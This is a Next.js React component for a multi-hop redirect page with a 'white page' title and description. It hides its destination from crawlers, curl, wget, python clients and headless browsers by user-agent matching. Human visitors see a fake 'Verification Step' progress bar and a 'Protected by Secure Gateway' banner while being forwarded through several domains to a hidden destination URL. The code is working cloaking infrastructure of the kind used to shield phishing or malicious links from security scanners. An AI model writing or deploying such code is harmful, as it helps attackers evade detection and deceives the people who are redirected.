"use client";

import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";

interface ChainData {
  id: string;
  destinationUrl: string;
  steps: { domain: string; delay: number }[];
  whitePageTitle: string;
  whitePageDescription: string;
  botMode: string;
  isActive: boolean;
}

export default function ChainRedirect() {
  const searchParams = useSearchParams();
  const [chain, setChain] = useState<ChainData | null>(null);
  const [step, setStep] = useState(0);
  const [blocked, setBlocked] = useState(false);
  const [progress, setProgress] = useState(0);
  const [ready, setReady] = useState(false);

  useEffect(() => {
    const path = window.location.pathname;
    const parts = path.split("/").filter(Boolean);

    if (parts.length >= 1 && parts[0] === "c") {
      if (parts.length >= 3) {
        const chainId = parts[1];
        const stepNum = parseInt(parts[2]) || 0;

        fetch(`/api/chain?id=${chainId}`)
          .then((r) => r.json())
          .then((data) => {
            const ch = data.chains?.find(
              (c: ChainData) => c.id === chainId
            );
            if (!ch || !ch.isActive) {
              setBlocked(true);
              return;
            }
            setChain(ch);
            setStep(stepNum);
            setReady(true);
          })
          .catch(() => setBlocked(true));
      } else if (parts.length === 1) {
        fetch("/api/chain")
          .then((r) => r.json())
          .then(() => setBlocked(true))
          .catch(() => setBlocked(true));
      }
    }
  }, [searchParams]);

  useEffect(() => {
    if (!ready || !chain) return;

    const ua = navigator.userAgent;
    const botPatterns = [
      /bot|crawl|spider|scrape|fetch/i,
      /curl|wget|python|go-http/i,
      /headless|phantom|selenium|puppeteer/i,
    ];

    const isBot = botPatterns.some((p) => p.test(ua));
    if (isBot) {
      // eslint-disable-next-line react-hooks/set-state-in-effect
      setBlocked(true);
      return;
    }

    const currentDelay =
      step < chain.steps.length
        ? chain.steps[step].delay
        : 2000;

    const interval = setInterval(() => {
      setProgress((prev) => {
        const next = prev + 100 / (currentDelay / 50);
        if (next >= 100) {
          clearInterval(interval);

          if (step < chain.steps.length - 1) {
            const nextStep = step + 1;
            const token = window.location.pathname.split("/")[3] || "";
            window.location.href = `/c/${chain.id}/${nextStep}/${token}`;
          } else {
            window.location.href = chain.destinationUrl;
          }

          return 100;
        }
        return next;
      });
    }, 50);

    return () => clearInterval(interval);
  }, [ready, chain, step]);

  if (blocked) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center px-4">
          <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-8 h-8 text-red-500"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-2">
            Access Restricted
          </h1>
          <p className="text-gray-500 text-sm">
            Your request could not be processed.
          </p>
        </div>
      </div>
    );
  }

  if (!ready || !chain) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-gray-200 border-t-blue-500 rounded-full animate-spin mx-auto mb-4" />
          <p className="text-gray-400 text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  const currentDomain =
    step < chain.steps.length ? chain.steps[step].domain : "destination";

  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-2xl mx-auto px-6 py-20">
        <header className="mb-10 text-center">
          <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-6 h-6 text-blue-500"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
              />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">
            {chain.whitePageTitle}
          </h1>
          <p className="text-gray-500">{chain.whitePageDescription}</p>
        </header>

        <main>
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                <span className="text-sm text-gray-600">
                  Verification Step {step + 1} of {chain.steps.length}
                </span>
              </div>
              <span className="text-xs text-gray-400 font-mono">
                {currentDomain}
              </span>
            </div>
            <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full bg-blue-500 rounded-full transition-all duration-100"
                style={{ width: `${progress}%` }}
              />
            </div>
            <div className="flex justify-between mt-2">
              {chain.steps.map((s, i) => (
                <div
                  key={i}
                  className={`text-[10px] ${
                    i < step
                      ? "text-green-500"
                      : i === step
                        ? "text-blue-500 font-semibold"
                        : "text-gray-300"
                  }`}
                >
                  {i < step ? "✓" : i === step ? "●" : "○"} {s.domain.split(".")[0]}
                </div>
              ))}
            </div>
          </div>

          <div className="text-center text-sm text-gray-400 space-y-2">
            <p>Please wait while we verify your access through our security network.</p>
            <p className="text-xs">
              Checking via: <code className="text-gray-500">{currentDomain}</code>
            </p>
          </div>
        </main>

        <footer className="mt-16 pt-6 border-t border-gray-100 text-center text-xs text-gray-400">
          <p>Protected by Secure Gateway</p>
        </footer>
      </div>
    </div>
  );
}
